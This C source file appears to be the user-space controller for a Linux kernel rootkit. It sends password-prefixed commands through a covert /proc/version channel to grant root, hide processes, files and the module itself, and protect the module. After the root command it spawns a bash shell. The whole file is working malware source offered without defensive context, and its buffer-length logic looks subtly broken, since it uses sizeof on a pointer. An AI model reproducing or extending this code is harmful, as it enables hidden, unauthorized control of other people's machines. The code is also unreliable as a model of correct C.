#include "ModuleCommunication.h"

#define CFG_PROC_FILE "version"
#define CFG_PASS "password"
#define CFG_ROOT "root"
#define CFG_HIDE_PID "hide_pid"
#define CFG_UNHIDE_PID "unhide_pid"
#define CFG_HIDE_FILE "hide_file"
#define CFG_UNHIDE_FILE "unhide_file"
#define CFG_HIDE "hide"
#define CFG_UNHIDE "unhide"
#define CFG_PROTECT "protect"
#define CFG_UNPROTECT "unprotect"

static char *alloc_buffer(const char *to_alloc, char *argument, int has_argument, size_t *buf_size)
{
    *buf_size += 1; // for null terminator

    char *buffer = malloc(*buf_size);
    buffer[*buf_size - 1] = 0;

    char *buf_ptr = buffer;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
    write_buffer(&buf_ptr, to_alloc, sizeof(to_alloc));
    if (has_argument)
        write_buffer(&buf_ptr, argument, strlen(argument));

    return buffer;
}

static char *create_buffer(char *input, char *argument, int has_argument, size_t *buf_size)
{
    *buf_size = 0;

    *buf_size += sizeof(CFG_PASS);

    if (strcmp(CFG_ROOT, input) == 0)
    {
        *buf_size += sizeof(CFG_ROOT);
        return alloc_buffer(CFG_ROOT, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_HIDE_PID, input) == 0 && has_argument)
    {
        *buf_size += sizeof(CFG_HIDE_PID) + strlen(argument);
        return alloc_buffer(CFG_HIDE_PID, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_UNHIDE_PID, input) == 0 && has_argument)
    {
        *buf_size += sizeof(CFG_UNHIDE_PID) + strlen(argument);
        return alloc_buffer(CFG_UNHIDE_PID, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_HIDE_FILE, input) == 0 && has_argument)
    {
        *buf_size += sizeof(CFG_HIDE_FILE) + strlen(argument);
        return alloc_buffer(CFG_HIDE_FILE, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_UNHIDE_FILE, input) == 0 && has_argument)
    {
        *buf_size += sizeof(CFG_UNHIDE_FILE) + strlen(argument);
        return alloc_buffer(CFG_UNHIDE_FILE, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_HIDE, input) == 0)
    {
        *buf_size += sizeof(CFG_HIDE);
        return alloc_buffer(CFG_HIDE, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_UNHIDE, input) == 0)
    {
        *buf_size += sizeof(CFG_UNHIDE);
        return alloc_buffer(CFG_UNHIDE, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_PROTECT, input) == 0)
    {
        *buf_size += sizeof(CFG_PROTECT);
        return alloc_buffer(CFG_PROTECT, argument, has_argument, buf_size);
    }
    else if (strcmp(CFG_UNPROTECT, input) == 0)
    {
        *buf_size += sizeof(CFG_UNPROTECT);
        return alloc_buffer(CFG_UNPROTECT, argument, has_argument, buf_size);
    }

    return NULL;
}

int start_command(char *input)
{
    char *argument;

    int has_argument = string_split(input, &argument, '=');

    char *buffer;

    size_t buf_size;
    buffer = create_buffer(input, argument, has_argument, &buf_size);

    if (buffer == NULL)
        return -1;

    if (open_writeToFile("/proc/" CFG_PROC_FILE, buffer, buf_size) == -1)
        return -1;

    free(buffer);

    if (strcmp(CFG_ROOT, input) == 0)
    {
        execl("/bin/bash", "bash", NULL);
    }
    return 0;
}
